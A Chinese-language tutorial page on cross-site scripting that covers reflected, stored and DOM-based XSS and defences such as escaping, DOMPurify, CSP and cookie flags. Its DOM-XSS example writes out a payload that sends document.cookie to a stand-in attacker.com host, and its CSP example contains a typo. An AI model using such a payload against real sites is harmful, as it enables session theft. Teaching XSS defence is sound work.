---
title: 前端XSS
order: 1
#article: false
category:
  - web安全
tag:
  - XSS
---

## XSS

XSS（Cross-Site Scripting）即跨站脚本攻击，是一种常见的前端安全漏洞。

## 定义与原理

XSS 攻击是指攻击者在目标网站上注入恶意脚本，当用户访问该网站时，浏览器会执行这些恶意脚本，从而导致用户信息泄露、操作被劫持等安全问题。其本质是由于网站对用户输入或输出的数据没有进行充分的过滤和验证，使得攻击者能够将恶意脚本插入到正常的页面内容中。

## 类型

### 反射型 XSS

也称为非持久型 XSS，攻击者将恶意脚本作为 URL 的一部分发送给用户，用户访问该 URL 时，服务器将恶意脚本反射给用户的浏览器并执行。

例如，攻击者构造一个包含恶意脚本的链接 `https://example.com/search?q=<script>alert('XSS')</script>`，用户点击该链接后，浏览器会弹出一个警告框。


当然实际攻击不可能是一个弹框，有可能是读取用户 `cookie` 发送到攻击者的服务器，或者劫持用户操作等。并且会把链接转码，或者去生成一个短链接，增加攻击的隐蔽性。

### 存储型 XSS

又称持久型 XSS，攻击者将恶意脚本存储在目标服务器上，当用户访问包含该恶意脚本的页面时，浏览器会自动执行脚本。

常见于评论区、留言板等用户可输入内容并存储的地方，攻击者在评论中插入恶意脚本，其他用户查看该评论时就会受到攻击。

例如，评论区输入 `<script>alert('XSS')</script>`, 当渲染到页面时，浏览器会执行该脚本。如果保存成功的，那么这条评论出现的地方，这个脚本都会被执行。

如果是一篇火热的微博或者新闻头条，那么每个进入这个页面的人都会受到攻击。

### DOM 型 XSS

通过修改页面的 DOM 结构来注入恶意脚本。攻击者利用网站前端代码中的漏洞，通过修改 DOM 节点的属性或内容，将恶意脚本插入到页面中。

这个其实和 `反射型 XSS` 有一点关系， 例如：

攻击者构造一个特殊的URL，例如：`http://example.com/page?param=&lt;script&gt;document.body.innerHTML += '<img src="http://attacker.com?cookie=&#39;+document.cookie+&#39;&quot;/&gt;&#39;&lt;/script&gt`;。

当用户访问该URL时，恶意脚本会将一个隐藏的图片标签插入到页面中，并将用户的cookie作为参数发送到攻击者的服务器上。


## 防御措施

### 输入输出过滤

**输入进行严格过滤**: 在前端和后端都对用户输入的数据进行过滤，去除或转义其中的特殊字符和 HTML 标签。例如，使用正则表达式对输入的文本进行匹配，替换或删除可能存在风险的字符和标签。

**对输出到页面的数据进行转义**: 在将数据输出到 HTML 页面时，使用相应的转义函数对数据进行处理，将特殊字符转换为 HTML 实体。

### 使用安全的 HTML 渲染库

一些 HTML 渲染库提供了安全的渲染机制，能够自动对输入进行过滤和转义，防止 XSS 攻击。如`DOMPurify` 库，它可以对 HTML 字符串进行净化处理，去除其中的恶意脚本，确保渲染的内容是安全的。

例如一些富文本编辑器的内容，最后需要渲染成 html，那么在富文本提交时，应该对内容过滤一遍，对脚本文件标签、内容进行转译，并且在渲染时，对内容进行净化。


### CSP

Content-Security-Policy（CSP）: CSP是一种安全机制，可以限制网页加载的资源，防止恶意脚本的执行。通过设置 CSP 头部，告诉浏览器哪些来源的脚本可以执行，哪些是被禁止的。

例如，设置 `Content-Security-Policy: script-src'self'; object-src 'none';` 表示只允许执行来自本站点的脚本，禁止加载任何外部的脚本和对象。


### Cookie 

设置 cookie 的 `HttpOnly` 属性，防止 JavaScript 通过 `document.cookie` 访问 cookie，从而防止攻击者通过 XSS 攻击获取用户的 cookie。

设置 cookie 的 `SameSite`，防止 DOM 型 XSS 攻击，例如 `SameSite=Strict`，表示在跨站请求时，不会发送 cookie。